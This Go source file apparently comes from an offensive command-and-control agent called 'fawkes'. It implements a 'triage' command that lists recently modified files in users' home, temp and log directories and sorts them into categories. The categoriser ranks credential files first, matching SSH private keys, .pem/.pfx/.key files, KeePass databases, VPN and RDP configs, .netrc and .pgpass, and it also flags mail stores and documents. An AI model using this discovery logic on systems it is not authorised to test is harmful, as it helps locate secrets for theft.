package commands

import (
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// triageRecent finds files modified within a time window across common directories.
// Useful for understanding current system activity — what's been touched recently.
func triageRecent(task structs.Task, args triageArgs) []triageResult {
	hours := int(args.Hours)
	if hours <= 0 {
		hours = 24 // default: last 24 hours
	}
	cutoff := time.Now().Add(-time.Duration(hours) * time.Hour)

	// Directories to skip (noise)
	skipDirs := map[string]bool{
		".cache": true, ".local": true, "node_modules": true,
		"__pycache__": true, ".git": true, ".npm": true,
		".cargo": true, ".rustup": true, "vendor": true,
		"Cache": true, "CachedData": true, "GPUCache": true,
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "AppData", "Roaming"),
			os.TempDir(),
		}
	case "darwin":
		searchPaths = []string{
			home,
			"/tmp",
			"/var/log",
		}
	default:
		searchPaths = []string{
			home,
			"/tmp",
			"/var/log",
			"/opt",
		}
	}

	var results []triageResult
	for _, basePath := range searchPaths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		_ = filepath.WalkDir(basePath, func(path string, d fs.DirEntry, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			if d.IsDir() {
				depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
				if depth > 4 {
					return filepath.SkipDir
				}
				if skipDirs[d.Name()] {
					return filepath.SkipDir
				}
				return nil
			}
			info, infoErr := d.Info()
			if infoErr != nil {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			if info.ModTime().Before(cutoff) {
				return nil
			}
			results = append(results, triageResult{
				Path:     path,
				Size:     info.Size(),
				ModTime:  info.ModTime().Format("2006-01-02 15:04"),
				Category: triageCategorizeFile(filepath.Base(path)),
			})
			return nil
		})
	}

	// Sort by modification time (newest first)
	sort.Slice(results, func(i, j int) bool {
		return results[i].ModTime > results[j].ModTime
	})

	return results
}

// triageCategorizeFile determines a file's category based on its name/extension.
func triageCategorizeFile(name string) string {
	ext := strings.ToLower(filepath.Ext(name))
	lower := strings.ToLower(name)

	// Credential patterns
	credPatterns := []string{"id_rsa", "id_ed25519", "id_ecdsa", ".pem", ".pfx", ".p12", ".key", ".kdbx", ".rdp", ".ovpn", "credentials", ".netrc", ".pgpass"}
	for _, p := range credPatterns {
		if strings.Contains(lower, p) {
			return "cred"
		}
	}

	// Document extensions
	docExts := map[string]bool{".doc": true, ".docx": true, ".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true, ".pdf": true, ".odt": true, ".csv": true, ".rtf": true}
	if docExts[ext] {
		return "doc"
	}

	// Config extensions
	cfgExts := map[string]bool{".conf": true, ".cfg": true, ".ini": true, ".yaml": true, ".yml": true, ".json": true, ".xml": true, ".env": true, ".toml": true, ".properties": true}
	if cfgExts[ext] {
		return "config"
	}

	// Script/code
	codeExts := map[string]bool{".py": true, ".sh": true, ".ps1": true, ".bat": true, ".rb": true, ".pl": true, ".js": true, ".go": true}
	if codeExts[ext] {
		return "script"
	}

	// Log files
	if ext == ".log" || strings.Contains(lower, "log") {
		return "log"
	}

	// Database files
	dbExts := map[string]bool{".db": true, ".sqlite": true, ".sqlite3": true, ".mdb": true}
	if dbExts[ext] {
		return "database"
	}

	// Mail files
	mailExts := map[string]bool{".pst": true, ".ost": true, ".eml": true, ".msg": true, ".mbox": true, ".emlx": true, ".dbx": true, ".nsf": true}
	if mailExts[ext] {
		return "mail"
	}

	return "other"
}
